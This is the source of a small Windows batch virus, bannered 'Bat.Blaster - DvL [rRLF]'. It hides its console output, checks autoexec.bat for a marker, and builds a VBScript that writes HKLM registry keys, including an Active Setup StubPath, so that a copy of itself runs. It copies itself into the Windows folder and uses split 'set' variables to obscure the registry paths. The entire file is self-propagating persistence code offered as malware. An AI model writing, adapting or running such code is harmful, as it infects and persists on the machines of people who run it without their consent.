@ctty nul
echo.>con
echo.>con
echo.>con
echo                    +----------------------------------------+>con
echo                    I        Bat.Blaster - DvL [rRLF]        I>con
echo                    +----------------------------------------+>con
echo.>con
echo.>con
if not exist c:\autoexec.bat goto end
find /i "blaster" c:\autoexec.bat
if errorlevel 1 goto end
echo.set blaster=CreateObject("wscript.shell")>%tmp%\"%blaster%.vbs"
set .=set
%.% HKEY=HKEY
%.% LOCAL=LOCAL
%.% MACHINE=MACHINE
%.% Software=Software
%.% Microsoft=Microsoft
%.% Setup=Setup
%.% Path=Path
echo.blaster.RegWrite "%HKEY%_%LOCAL%_%MACHINE%\%Software%\%Microsoft%\Windows\CurrentVersion\%Setup%\Source%Path%","%blaster%">>%tmp%\"%blaster%.vbs"
echo.blaster.RegWrite "%HKEY%_%LOCAL%_%MACHINE%\%Software%\%Microsoft%\Active %Setup%\Installed Components\KeyName\Stub%Path%","%windir%\%blaster%.bat">>%tmp%\"%blaster%.vbs"
copy %0 %windir%\"%blaster%.bat">nul
ren %tmp%\"%blaster%.vbs" %tmp%\blaster.vbs
cscript %tmp%\blaster.vbs
:end
cls